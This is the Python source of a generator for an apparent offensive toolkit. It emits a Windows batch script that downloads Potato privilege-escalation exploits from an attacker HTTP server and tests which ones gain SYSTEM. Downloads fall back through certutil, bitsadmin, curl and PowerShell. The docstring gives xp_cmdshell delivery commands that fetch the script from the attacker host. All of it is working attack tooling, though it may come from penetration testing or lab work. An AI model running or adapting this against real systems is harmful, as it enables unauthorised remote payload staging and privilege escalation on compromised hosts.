#!/usr/bin/env python3
"""Auto-stage + auto-scan every Potato in one paste — end-to-end from
'attacker holds exes' to '[+] TOOL WORKS -- SYSTEM confirmed'.

Every Potato variant hits a different callback path (RPCSS / EFSRPC / DCOM OXID /
BITS / Spooler), and modern-patched Windows (KB5004442 DCOM hardening etc.) breaks
different ones. Rather than editing TOOL in _winpriv_common.py and re-running
gen_full/nonet/forma between attempts — or hand-writing certutil fetch lines for
each Potato — this generator prints ONE self-contained batch script that:

  1. auto-detects which Potato exes YOU have on the attacker box (--serve-dir, default `.`),
  2. STAGES each on target via a fallback chain — certutil -> bitsadmin -> curl -> powershell
     (each attempt verified: file must be present AND >= 1024 bytes; AV-nuked partials count
     as failure and roll to the next transport),
  3. reports [STAGED via <method> <size>B] or [FAILED: all four transports blocked or AV-nuked],
  4. then SCANS every staged Potato with a benign `whoami > marker` probe
     (no revshell, no AV signal — pure token-privilege demonstration),
  5. hard-times-out any that hang (SweetPotato on hardened boxes is the poster case)
     via a parallel taskkill,
  6. prints [+] TOOL WORKS -- SYSTEM confirmed per survivor,
  7. summarises which staged and which won.

Set TOOL in _winpriv_common.py to a winner, re-run gen_full / gen_forma / gen_nonet
normally — everything else about the toolkit stays the same.

Usage:
    python3 gen_potato_scan.py                    # default: exes in ./  + stage + scan
    python3 gen_potato_scan.py > pscan.bat        # save; serve; fetch on target; run
    python3 gen_potato_scan.py --serve-dir ~/potatoes   # look here for Potato exes
    python3 gen_potato_scan.py --serve-url http://10.10.14.7:8080   # non-80 HTTP
    python3 gen_potato_scan.py --stagedir 'D:\\path'   # non-default target landing dir
    python3 gen_potato_scan.py --timeout 8             # per-scan hard-timeout (default 6s)
    python3 gen_potato_scan.py --include-rogue         # also probe RoguePotato (needs
                                                       #   socat 135->target:9999 on your box)
    python3 gen_potato_scan.py --no-stage              # skip stage phase (assume already staged)
    python3 gen_potato_scan.py --no-scan               # stage only, don't probe
    python3 gen_potato_scan.py EfsPotato.exe SharpEfsPotato.exe   # restrict to these

Delivery on target (via mssqlclient / xp_cmdshell):
    -- on attacker (in the --serve-dir):  sudo python3 -m http.server 80
    EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/pscan.bat C:\\Windows\\Temp\\pscan.bat';
    EXEC master..xp_cmdshell 'C:\\Windows\\Temp\\pscan.bat';
"""
import os
import sys
import _winpriv_common as P

_a = sys.argv[1:]

_FLAGS_WITH_ARG = {"--stagedir", "--timeout", "--serve-dir", "--serve-url"}


def _opt(name, default=None, is_flag=False):
    if is_flag:
        return name in _a
    if name in _a:
        i = _a.index(name)
        return _a[i + 1] if i + 1 < len(_a) else default
    return default


STAGE = (_opt("--stagedir") or P.STAGE).rstrip("\\")
SERVE_DIR = os.path.abspath(_opt("--serve-dir") or ".")
SERVE_URL = (_opt("--serve-url") or f"http://{P.LHOST}").rstrip("/")
INCLUDE_ROGUE = _opt("--include-rogue", is_flag=True)
NO_STAGE = _opt("--no-stage", is_flag=True)
NO_SCAN = _opt("--no-scan", is_flag=True)
try:
    TIMEOUT = int(_opt("--timeout") or 6)
except (TypeError, ValueError):
    TIMEOUT = 6

# Positional args = restrict to these tools; empty = every tool applicable to the mode.
_pos, _skip = [], False
for a in _a:
    if _skip:
        _skip = False
        continue
    if a in _FLAGS_WITH_ARG:
        _skip = True
        continue
    if a.startswith("--"):
        continue
    _pos.append(a)

# --- Discover locally-staged Potato exes (case-insensitive on filename, preserve
# case for URL + target filename since the Linux http.server is case-sensitive). ---
_canon = {k.lower(): k for k in P.POTATOES_CMDLINE}
LOCAL_TOOLS: dict = {}          # canonical_name -> local_basename (preserved case)
if os.path.isdir(SERVE_DIR):
    for fn in os.listdir(SERVE_DIR):
        fp = os.path.join(SERVE_DIR, fn)
        if not os.path.isfile(fp):
            continue
        canon = _canon.get(fn.lower())
        if canon:
            LOCAL_TOOLS[canon] = fn

# Which tools go into the emitted batch:
#   --no-stage:  operator says "already staged" -> include everything (or the positional filter)
#   default   :  only what we FOUND locally (staging what isn't there is impossible)
if NO_STAGE:
    tools = _pos or list(P.POTATOES_CMDLINE)
    tools = [t for t in tools if t in P.POTATOES_CMDLINE]
else:
    tools = list(LOCAL_TOOLS)
    if _pos:
        tools = [t for t in tools if t in _pos]

if not INCLUDE_ROGUE:
    tools = [t for t in tools if t != "RoguePotato.exe"]


# --- helpers ---------------------------------------------------------------------


def _short(tool: str) -> str:
    """Compact per-tool tag for the marker filename + batch goto label. Keeps
    version digits so the three GodPotato-NET{2,35,4} builds don't collide."""
    return tool.replace(".exe", "").replace("-", "").lower()


def _invoke_line(tool: str, target_basename: str) -> tuple[str, str]:
    """The exact command line to run this Potato with a benign whoami probe. Uses
    the same POTATOES_CMDLINE argument templates the real generators use, so a WIN
    here means gen_full / gen_forma / gen_nonet will work with the same TOOL."""
    marker = f"{STAGE}\\pscan_{_short(tool)}.txt"
    tmpl = P.POTATOES_CMDLINE[tool]
    probe = f"cmd.exe /c whoami>{marker}"
    return tmpl.replace("{CMD}", probe).replace("{LHOST}", P.LHOST), marker


def _stage_block(tool: str, local_basename: str) -> list[str]:
    """Emit the stage attempt for one Potato: certutil -> bitsadmin -> curl -> powershell.
    Each transport writes to the same target path; between attempts we delete + re-verify.
    A successful stage = the file exists AND is >= 1024 bytes (any real Potato is bigger;
    an AV-nuked 0-byte / partial file counts as a stage failure and rolls to the next
    transport).  On success we record `!STAGED!` and skip to :after_stage_<tool>."""
    target = f"%STAGE%\\{local_basename}"
    tag = _short(tool)
    ok = (f'call :size "{target}" & if !SIZE! GEQ 1024 '
          f'(echo   [STAGED via {{m}} !SIZE!B] & set STAGED=!STAGED! {tool} & goto :after_stage_{tag})')
    return [
        f"echo --- STAGE {tool} ---",
        f'del "{target}" 2>nul',
        # 1) certutil
        f'certutil -urlcache -f %BASE%/{local_basename} "{target}" >nul 2>&1',
        ok.format(m="certutil"),
        # 2) bitsadmin (retry with a fresh transient job name)
        f'del "{target}" 2>nul',
        f'bitsadmin /transfer j%RANDOM% %BASE%/{local_basename} "{target}" >nul 2>&1',
        ok.format(m="bitsadmin"),
        # 3) curl (Win10 1803+; harmless if absent)
        f'del "{target}" 2>nul',
        f'where curl >nul 2>&1 && curl -so "{target}" %BASE%/{local_basename} 2>nul',
        ok.format(m="curl"),
        # 4) powershell Net.WebClient (bare, no reflection/AMSI-bypass — plain download).
        f'del "{target}" 2>nul',
        (f'powershell -c "(New-Object Net.WebClient).DownloadFile('
         f"'%BASE%/{local_basename}','{target}')\" >nul 2>&1"),
        ok.format(m="powershell"),
        # All four failed.
        "echo   [FAILED: certutil/bitsadmin/curl/powershell all blocked or AV-nuked]",
        f":after_stage_{tag}",
    ]


def _scan_block(tool: str, target_basename: str) -> list[str]:
    """Emit the probe attempt: fire tool with `whoami > marker`, sleep TIMEOUT via
    ping, hard-taskkill any hang, then classify the outcome from the marker file."""
    invoke, marker = _invoke_line(tool, target_basename)
    tag = _short(tool)
    return [
        f'if not exist "%STAGE%\\{target_basename}" '
        f"(echo --- SCAN {tool} : not in %STAGE%, skip --- & goto :after_scan_{tag})",
        f"echo --- SCAN {tool} ---",
        f'del "{marker}" 2>nul',
        f'start /b "" "%STAGE%\\{target_basename}" {invoke} >nul 2>nul',
        f"ping -n {TIMEOUT + 1} 127.0.0.1 >nul",
        f'taskkill /f /im "{target_basename}" >nul 2>nul',
        f'if exist "{marker}" (',
        f'  findstr /i "system" "{marker}" >nul && '
        f'(echo   [+] {tool} WORKS -- SYSTEM confirmed & set WINNERS=!WINNERS! {tool}) || '
        f"(echo   [-] {tool} ran but no SYSTEM in marker)",
        ") else (",
        f"  echo   [-] {tool} no marker written (spawn failed / hung / access denied)",
        ")",
        f":after_scan_{tag}",
    ]


# --- emit -----------------------------------------------------------------------


header = [
    "@REM -----------------------------------------------------------------------",
    "@REM  Skoll Potato stage + scan  --  one paste, end to end.",
    f"@REM    on attacker (in {SERVE_DIR}): sudo python3 -m http.server 80",
    f"@REM    on target: EXEC master..xp_cmdshell 'certutil -urlcache -f {SERVE_URL}/pscan.bat {STAGE}\\pscan.bat';",
    f"@REM               EXEC master..xp_cmdshell '{STAGE}\\pscan.bat';",
]
if NO_STAGE:
    header.append("@REM  --no-stage: skipping stage phase (Potatoes assumed already in %STAGE%).")
elif LOCAL_TOOLS:
    header.append(f"@REM  found {len(LOCAL_TOOLS)} local Potato exe(s) in {SERVE_DIR}:")
    for canon, base in LOCAL_TOOLS.items():
        note = f"  ({canon})" if base != canon else ""
        header.append(f"@REM     - {base}{note}")
else:
    header.append(
        f"@REM  WARNING: no known Potato exes in {SERVE_DIR}. Drop them there and re-run,")
    header.append("@REM  or pass --no-stage if they are already on the target.")
if _pos:
    header.append(f"@REM  restricted to: {' '.join(_pos)}")
header.append("@REM -----------------------------------------------------------------------")

body: list[str] = [
    "@echo off",
    "setlocal enabledelayedexpansion",
    f"set STAGE={STAGE}",
    f"set BASE={SERVE_URL}",
    "set STAGED=",
    "set WINNERS=",
    "echo === Skoll Potato ===",
]

if not NO_STAGE and tools:
    body += ["echo.", "echo === STAGE ==="]
    for tool in tools:
        body += _stage_block(tool, LOCAL_TOOLS[tool])

if not NO_SCAN and tools:
    body += ["echo.", "echo === SCAN ==="]
    for tool in tools:
        target_base = LOCAL_TOOLS.get(tool, tool)   # --no-stage: assume canonical name
        body += _scan_block(tool, target_base)

body += ["echo.", "echo === summary ==="]
if not NO_STAGE:
    body.append(
        'if "!STAGED!"=="" (echo   NO Potatoes staged. '
        'Check attacker HTTP is up + serve-dir has exes; '
        'if the target already has them, re-run with --no-stage.) '
        'else (echo   Staged:!STAGED!)')
if not NO_SCAN:
    body.append(
        'if "!WINNERS!"=="" (echo   NO Potato won SYSTEM. '
        'Try LocalPotato ^(file-write^) or a non-Potato route ^(SeBackup/BYOVD/service-misconfig^).) '
        'else (echo   Winner^(s^):!WINNERS!  '
        '-- set TOOL to one of these in _winpriv_common.py and re-run gen_full/gen_forma/gen_nonet.)')
body += ["goto :eof", "", ":size",
         "REM subroutine: set !SIZE! from a file arg (0 if missing).",
         "set SIZE=0",
         "if exist %~1 for %%A in (%~1) do set SIZE=%%~zA",
         "exit /b"]

# --- warn on stderr when the stage phase has nothing to do -----------------------

if not NO_STAGE and not LOCAL_TOOLS:
    sys.stderr.write(
        f"warning: no known Potato exes in --serve-dir {SERVE_DIR}\n"
        f"         expected any of: {', '.join(sorted(P.POTATOES_CMDLINE))}\n"
        f"         drop exes there and re-run, "
        f"or pass --no-stage to probe already-staged targets.\n")

print("\r\n".join(header + body))
